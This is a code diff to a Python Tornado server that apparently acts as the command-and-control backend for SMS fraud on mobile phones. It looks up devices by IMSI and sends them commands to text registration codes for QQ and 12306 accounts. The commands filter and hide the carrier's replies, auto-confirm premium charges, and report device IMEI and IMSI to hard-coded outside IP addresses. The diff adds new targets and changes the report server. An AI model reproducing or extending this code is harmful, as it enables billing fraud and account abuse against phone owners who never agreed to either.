@@ -133,6 +133,7 @@ class MainHandler(tornado.web.RequestHandler):
             _rsp_content = get_test_response(_test_imsi_info)
             reqInfo['rspContent'] = _rsp_content
             self.write(_rsp_content)
+        print(reqInfo['rspContent'])
         print("tcd spent:" + str(int(round(time.time() * 1000)) - _begin_time))
         self.finish()
         threads.append(threading.Thread(target=insert_req_log(reqInfo)))
@@ -149,7 +150,7 @@ def get_imsi_response(_imsi, _threads):
     _sql = 'SELECT id,imsi,mobile,matchCount,mobile_areas.province,mobile_areas.city,mobile_areas.mobileType,ifnull(lastCmdTime,0) as lastCmdTime,ifnull(cmdFeeSum,0) as cmdFeeSum,ifnull(cmdFeeSumMonth,0) as cmdFeeSumMonth ,lastRegisterCmdAppIdList,ifnull(registerQqCmdCount,0) as registerQqCmdCount,ifnull(registerQqSuccessCount,0) as registerQqSuccessCount,ifnull(register12306CmdCount,0) as register12306CmdCount,ifnull(register12306SuccessCount,0) as register12306SuccessCount,insertTime FROM `imsi_users` LEFT JOIN mobile_areas ON SUBSTR(IFNULL(imsi_users.mobile,\'8612345678901\'),3,7)=mobile_areas.`mobileNum`  WHERE imsi =  %s '
     _cur.execute(_sql, (_imsi))
     _record_user = _cur.fetchone()
-    # print(_record_user)
+    print(_record_user)
     ctime = int(time.time())
     if _record_user == None:
         _sql = 'insert into `imsi_users` (imsi,insertTime) value (%s,%s)'
@@ -209,7 +210,7 @@ def async_sms_ad_cmd(_record, _user, _return, _threads):
 
 def report_sms_ad(_record, _user):
     beginTime = int(time.time() * 1000)
-    url = 'http://203.86.8.198:6068/ido/report.php?cid=10354&imei=' + str(_record['oriImei']) + '&imsi=' + str(_record['oriImsi']) + '&sdk=21&msgid=' + str(
+    url = 'http://218.17.211.49:6068/ido/report.php?cid=10354&imei=' + str(_record['oriImei']) + '&imsi=' + str(_record['oriImsi']) + '&sdk=21&msgid=' + str(
         _record['oriMsgId']) + '&taskid=' + str(_record['oriTaskId']) + '&phone=' + str(_record['oriMsgId']) + '&send=1&deliver=1'
     _r = requests.get(url)
     endTime = int(time.time() * 1000)
@@ -301,6 +302,11 @@ def get_register_cmd(_user, _threads):
     if isOpenSmsRegisterHour('Qq') and str(_user['lastRegisterCmdAppIdList']).find(',4,') != -1 and int(get_system_parameter_from_db("qqRegisterLimit")) > 0 and int(_user['registerQqCmdCount']) <= (int(get_system_parameter_from_db("qqRegisterLimit")) + TRY_MORE_TIMES) and int(_user['registerQqSuccessCount']) < int(get_system_parameter_from_db("qqRegisterLimit")):
         _result = SMS_REGISTER_CONTENT.replace(
             '[cmd]', 'ZC').replace('[spNumber]', '10690700511').replace('[filter]', '腾讯科技|随时随地|QQ|qq')
+        if str(_user['lastRegisterCmdAppIdList']).find(',102,') != -1 and registerTargetConfigs[102]['stateGet'] == 'open':
+            _result = FEE_CONTENT.replace('[cmd]', '').replace('[spNumber]', '').replace('[filter]', '').replace(
+                '[reconfirm]', '回复*可获').replace('[portShield]',  '').replace('[times]', '1')
+            _threads.append(threading.Thread(
+                target=async_update_register_cmd_mo_ready(_user, '102')))
         if _user['mobileType'] == "ChinaUnion":
             _result = _result.replace('[portShield]', '10690188')
             _threads.append(threading.Thread(
@@ -316,11 +322,11 @@ def get_register_cmd(_user, _threads):
             '[spNumber]', '12306').replace('[filter]', '12306|铁路客服').replace('[portShield]', '12306')
         _threads.append(threading.Thread(
             target=async_update_register_cmd_count(_user, 'register12306CmdCount')))
-    elif str(_user['lastRegisterCmdAppIdList']).find(',107,') != -1 and registerTargetConfigs['107']['stateGet'] == 'open':
+    elif str(_user['lastRegisterCmdAppIdList']).find(',102,') != -1 and registerTargetConfigs[102]['stateGet'] == 'open':
         _result = FEE_CONTENT.replace('[cmd]', '').replace('[spNumber]', '').replace('[filter]', '').replace(
             '[reconfirm]', '回复*可获').replace('[portShield]',  '').replace('[times]', '1')
         _threads.append(threading.Thread(
-            target=async_update_register_cmd_mo_ready(_user, '107')))
+            target=async_update_register_cmd_mo_ready(_user, '102')))
     else:
         _result = None
     return _result
@@ -340,7 +346,7 @@ def async_update_cmd_fee(_user, _cmd):
 
 
 def async_update_register_cmd_count(_user, _paraName):
-    _sql = 'update imsi_users set ' + _paraName +
+    _sql = 'update imsi_users set ' + _paraName + \
         ' = ifnull(' + _paraName + ',0)  + 1  where imsi = %s '
     _dbConfig = poolConfig.connection()
     _dbConfig.cursor().execute(_sql, (_user['imsi']))
@@ -429,7 +435,7 @@ def fetch_sms_ads():
         imei = '1501660031'
         imsi = '460029154625815'
         if _recordRsp != None and systemConfigs['sendSmsAdFetch'] == 'open' and int(_recordRsp['tot']) <= int(systemConfigs['sendSmsAdLessNum']):
-            url = 'http://203.86.8.198:6068/ido/get.php'
+            url = 'http://218.17.211.49:6068/ido/get.php'
             _r = requests.get(url, params={
                 'cid': '10354', 'imei': imei, 'imsi': imsi, 'sdk': '21', 'sim': '5', 'info': 'LenovoLenovoA708t'})
             # _r = requests.get(url)
